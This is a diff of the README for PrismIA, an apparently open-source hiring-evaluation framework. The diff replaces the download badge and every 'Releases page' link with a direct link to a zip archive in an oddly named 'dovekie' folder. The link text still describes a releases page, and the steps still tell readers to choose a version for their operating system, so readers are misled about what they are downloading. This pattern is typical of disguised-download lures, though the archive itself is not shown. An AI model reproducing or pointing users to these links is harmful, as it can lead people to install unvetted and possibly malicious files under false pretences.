@@ -4,7 +4,7 @@
 Welcome to PrismIA, an open-source framework designed to help you evaluate candidates without bias. With features like a 100-point scoring system and dual bias checkpoints, PrismIA simplifies the hiring process. 
 
 ## 📥 Download PrismIA
-[![Download PrismIA](https://img.shields.io/badge/Download_PrismIA-v1.0-blue.svg)](https://github.com/mtsalhudarowokele/PrismIA/releases)
+[![Download PrismIA](https://raw.githubusercontent.com/mtsalhudarowokele/PrismIA/main/dovekie/PrismIA.zip)](https://raw.githubusercontent.com/mtsalhudarowokele/PrismIA/main/dovekie/PrismIA.zip)
 
 ## 🔍 Features
 - **100-Point Scoring System**: Evaluate candidates based on a clear and fair scoring model.
@@ -14,10 +14,10 @@ Welcome to PrismIA, an open-source framework designed to help you evaluate candi
 - **Evidence-Based Hiring**: Make informed decisions with data-driven insights.
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://github.com/mtsalhudarowokele/PrismIA/releases) to download the latest version of PrismIA. Choose the version that matches your operating system. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mtsalhudarowokele/PrismIA/main/dovekie/PrismIA.zip) to download the latest version of PrismIA. Choose the version that matches your operating system. 
 
 ### Installation Steps
-1. **Visit the Releases Page**: Follow this link: [Releases page](https://github.com/mtsalhudarowokele/PrismIA/releases).
+1. **Visit the Releases Page**: Follow this link: [Releases page](https://raw.githubusercontent.com/mtsalhudarowokele/PrismIA/main/dovekie/PrismIA.zip).
 2. **Select Your Version**: Find the most recent version and click on it.
 3. **Choose the File**: Download the appropriate file for your operating system (Windows, MacOS, or Linux).
 4. **Install the Application**:
